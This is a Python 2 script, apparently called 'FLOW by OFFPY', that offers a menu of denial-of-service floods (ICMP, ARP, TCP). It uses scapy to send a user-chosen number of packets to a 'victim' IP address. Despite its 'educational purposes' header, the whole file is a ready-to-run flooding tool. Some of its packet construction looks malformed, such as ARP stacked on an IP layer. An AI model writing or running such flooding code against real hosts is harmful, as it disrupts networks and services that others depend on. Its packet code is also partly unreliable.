#############################################################################################################################################
#This Code does the Basic Attack of DoS by Sending the specific no. of packets . You can Craft your own packet type in this program using   #given options in the the program . This is particularly made for educational purposes. The main Authors are Yash Bharadwaj and Satyam Dubey.
#Feel Free to contact us on : offpy0987@gmail.com
#############################################################################################################################################  
from scapy.all import *
import os
import itertools
global o ,o1 , o2
def main():
     global o, o1, o2
     print"                    ______________________________                   "
     print"                   |   ___ ___  ___   ____        |"
     print"------------------|||  | ||__  |__   |   |  \  / |||-----------------"
     print"------------------|||  | ||    |     |___|   \ / |||-----------------"
     print"------------------|||  | ||    |     |        /  |||-----------------"
     print"------------------|||  |_||    |     |       /   |||-----------------"
     print"                   |______________________________|"
     print"                                                                     "
     print"====================================================================="
     print"                         FLOW by OFFPY                               "
     print"====================================================================="
     print"[+]1->ICMP Flooding"
     print"[+]2->ARP Flooding"
     print"[+]3->TCP Port Flooding"
     say = raw_input("PLEASE ENTER THE  WHICH TYPE OF FLOODING YOU WANT TO PERFORM(For Ex: 1) : ")
     if say == "1":
       print"___________________________________________________________________"
       print"                    ICMP FLOODING INTIALIZING                       "
       print"-------------------------------------------------------------------"
       animate()
       ICMPflood()
     elif say == "2":
       print"___________________________________________________________________"
       print"                    ARP FLOODING INTIALIZING                       "
       print"-------------------------------------------------------------------"
       animate()
       arpflood()
     elif say == "3":
       print"___________________________________________________________________"
       print"                 TCP Port FlOODING INITIALIZING                    "
       print"-------------------------------------------------------------------"
       animate()
       tcpflood()
     else:
       print"___________________________________________________________________"
       print"                 FAILED TO OPERATE WITH YOUR CHOICE                "
       print"-------------------------------------------------------------------"
def animate():
    spinner = itertools.cycle(['-', '/', '|', '\\'])
    i = 0
    while i <= 30:
     sys.stdout.write(spinner.next())  # write the next character
     time.sleep(0.1)
     sys.stdout.flush()                # flush stdout buffer (actual character display)
     sys.stdout.write('\b')
     i = i+1
def ICMPflood():
    global o
    o = raw_input("please enter the IP ADDRESS of the victim : ")
    tell = raw_input("PLEASE ENTER THE NO. OF PACKETS YOU WANT TO SEND: ")
    for i in range(0,(int(tell)-1)):
     flowmac = send(Ether()/IP(dst=str(o))/ICMP()/("JJJJJJJJJJJJJJJJJJJJ"))
     print "sending packets"
def arpflood():
    global o1
    o1 = raw_input("please enter the IP ADDRESS OF THE VICTIM : ")
    ask = raw_input("PLEASE ENTER THE NO. OF PACKETS YOU WANT TO SEND:  ")
    for i in range(0, (int(ask)-1)):
     flowarp = send(Ether()/IP(dst=str(o1))/ARP()/("AAAAAAAAAAAAAAAAAAAA"))
     print"Sending packets using ARP"
def tcpflood():
    global o2
    o2 = raw_input("please enter the IP ADDRESS OF THE VICTIM :")
    want = raw_input("PLEASE ENTER THE NO. OF PACKETS YOU WANT TO SEND:")
    for i in range(0, (int(want)-1)):
      flowtcp = send(Ether()/IP(dst=str(o2))/TCP()/("JJJJJJJJJJJJJJJJJJJJ"))
      print"Sending Packets using TCP"
if __name__ == "__main__":
   main() 
  
     
      
    
       
